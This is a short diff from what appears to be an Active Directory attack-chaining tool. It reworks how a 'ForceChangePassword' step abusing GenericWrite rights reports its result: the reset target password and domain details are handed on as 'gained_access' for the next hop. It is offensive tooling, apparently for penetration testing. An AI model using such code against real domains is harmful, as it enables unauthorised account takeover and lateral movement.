@@ -74,12 +74,21 @@ class GenericWriteStrategy(ExploitStrategy):
             raise HopFailedError(self.edge, f"Force change password failed:\n{output}")
         print_done(f"Password changed for {target_sam} → {new_password}")
         return ExploitResult(
-			success=True,
-			output=output,
-			technique="ForceChangePassword",
-			# carry new creds forward so the next hop can use them
-			new_creds={**creds, "username": target_sam, "password": new_password}
-		)
+            technique="ForceChangePassword",
+            edge=self.edge,
+            success=True,
+            notes=f"Administrator password reset to: {new_password}\n"
+                  f"You can now use credentials:\n"
+                  f"  Username: {target_sam}\n"
+                  f"  Password: {new_password}\n"
+                  f"  Domain: {creds['domain']}",
+            gained_access={
+                "username": target_sam,
+                "password": new_password,
+                "domain": creds.get("domain"),
+                "dc_ip": creds.get("dc_ip")
+            }
+        )
 
     def _force_change_password(self, creds: dict) -> ExploitResult:
         target_sam  = _sam(self.target.label)
